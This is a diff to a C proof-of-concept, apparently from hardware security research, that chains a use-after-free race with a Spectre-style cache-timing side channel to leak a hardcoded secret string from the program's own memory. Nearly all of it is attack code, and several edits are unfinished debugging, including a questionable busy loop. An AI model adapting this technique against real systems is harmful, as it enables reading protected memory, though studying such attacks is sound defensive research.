@@ -5,11 +5,11 @@
 #include <stdbool.h>
 #include <string.h>
 #define ATTACKER_CPU 1
-#define L3_CACHE_LINE_SIZE 16384
+#define L3_CACHE_LINE_SIZE 4096*4
 #define THRESHOLD 250
 #define NUM_THREADS 22
 
-typedef void (*callback_t)();
+typedef void (*callback_t)(int* arg);
 typedef struct victim_struct
 {
     callback_t callback;
@@ -21,18 +21,20 @@ pthread_mutex_t lock;
 unsigned long timer_length;
 unsigned long training_epochs;
 char *SECRET = "This is the secret we will leak";
-char buf[L3_CACHE_LINE_SIZE * 255 + 1];
+char buf[L3_CACHE_LINE_SIZE * 255 + 1]__attribute__((aligned(4096)));
 volatile int ret __cacheline_aligned;
 int freed = 0;
 int finished = 0;
 
-int benign_callback()
+
+int benign_callback(int* arg)
 {
     return 0;
 }
 
 void evil_callback(char *c)
 {
+    char data = *c;
     buf[*c * L3_CACHE_LINE_SIZE] = 1;
 }
 
@@ -45,13 +47,19 @@ void flush_buf()
 
 void leak_secret(char *secret, int offset)
 {
+
+    //pthread_t probe_thread;
     ret = pthread_mutex_trylock(&lock);
     flush(&ret);
-    if (likely(ret == 0))
-    {
-        v_st->callback(secret + offset);
-        pthread_mutex_unlock(&lock);
-    }
+   // pthread_create(&probe_thread, NULL, v_st->callback, secret+offset);
+   // nanosleep(&spec, 0);
+   // pthread_cancel(probe_thread);
+   if (likely(ret == 0))
+   {
+       v_st->callback(secret + offset);
+       pthread_mutex_unlock(&lock);
+       //printf("here!\n");
+   }
 }
 
 
@@ -70,18 +78,19 @@ char spectre_read(char *secret, int offset)
 
     leak_secret(secret, offset);
 
-    for (int j = 1; j < 255; j++)
+    for (int j = 0; j < 255; j++)
     {
         unsigned long timing;
         if ((timing = probe_timing(&buf[j * L3_CACHE_LINE_SIZE])) < THRESHOLD)
         {
             c = j;
             flush(&buf[j * L3_CACHE_LINE_SIZE]);
-            // printf("Hit timing %d --> j == %d\n", timing, j);
+             //printf("Hit timing %d --> j == %c\n", timing, j);
             // printf("j: %d\n", j);
             break;
         }
-        // printf("Miss timing %d\n", timing);
+
+            //printf("Miss timing %d\n", timing);
     }
 
     flush_buf();
@@ -99,14 +108,17 @@ void victim_thread()
     
     pthread_mutex_lock(&lock);
     
-    free(v_st);
-    
+   // free(v_st);
     freed = 1;
-    
+    float j = 0;
+    for (int i = 0; i < INT64_MAX; i += 2)
+    {
+        i--;
+    }
+
     //  Must interrupt exactly between free and mutex unlock for this to work
     pthread_mutex_unlock(&lock);
     clock_t end = clock();
-    for (int  i = 0; i < 10000; i++);
     // free structure here?
     double time = (double)1e3 * (end - start) / CLOCKS_PER_SEC;
     printf("Victim Thread Time: %7.2fms with timer resolution %ld\n", time, timer_length);
@@ -163,15 +175,29 @@ int main(int argc, char **argv)
     /*
         Other setup and initialization
     */
-    ret = pthread_mutex_init(&lock, NULL);
+    int ret = pthread_mutex_init(&lock, NULL);
     assert(ret == 0);
     ipi_register(NUM_THREADS);
     timer_init(timer_length);
     pin_cpu(ATTACKER_CPU);
    // printf("Finished setup.\n");
-
+    memset(buf, 'x', sizeof(buf));
+    flush_buf();
     train_lock();
-    //printf("Trained Lock\n");
+    printf("Trained Lock\n");
+    //pthread_mutex_lock(&lock);
+    //flush(&lock);
+    //if (likely(pthread_mutex_trylock(&lock) == 0))
+    //{
+    //    buf[*SECRET * L3_CACHE_LINE_SIZE] = 1;
+    //    pthread_mutex_unlock(&lock);
+    //}
+    //printf("Timing %d\n",  probe_timing(&buf['T'*L3_CACHE_LINE_SIZE]));
+    //leak_secret(SECRET, 0);
+    //printf("\n%c\n", spectre_read(SECRET, 0));
+    
+
+   // return 0;
     
     start_victim();
     
@@ -186,15 +212,19 @@ int main(int argc, char **argv)
 
     /*
         Memory allocation collision
+        
     */
 
     
-    if (!freed)
-    {
-        printf("not freed!\n");
-        timer_cleanup();
-        return;
-    }
+   // if (!freed)
+   // {
+   //     printf("not freed!\n");
+   //     timer_cleanup();
+   //     return;
+   // }
+    
+    free(v_st);
+
     victim_struct *p = malloc(sizeof(victim_struct));
     p->callback = evil_callback;
     assert(p);
@@ -204,11 +234,27 @@ int main(int argc, char **argv)
         timer_cleanup();
         return;
     }
-    printf("UAF succeeded.\n");
+    if (finished)
+    {
+        printf("Finished!\n");
+        timer_cleanup();
+    }
+    printf("UAF Succeeded!\n");
+
+   // pthread_create(&probe_thread, NULL, v_st->callback, secret+offset);
+   // nanosleep(&spec, 0);
+   // pthread_cancel(probe_thread);
+
+    
     for (int i = 0; i < strlen(SECRET); i++)
+    {
         printf("%c", spectre_read(SECRET, i));
+    }
+        
     printf("\n");
-    timer_cleanup();
+    kill_ipi();
+   // timer_cleanup();
+    
     //pthread_join(victim, NULL);
    // while(1);
 }
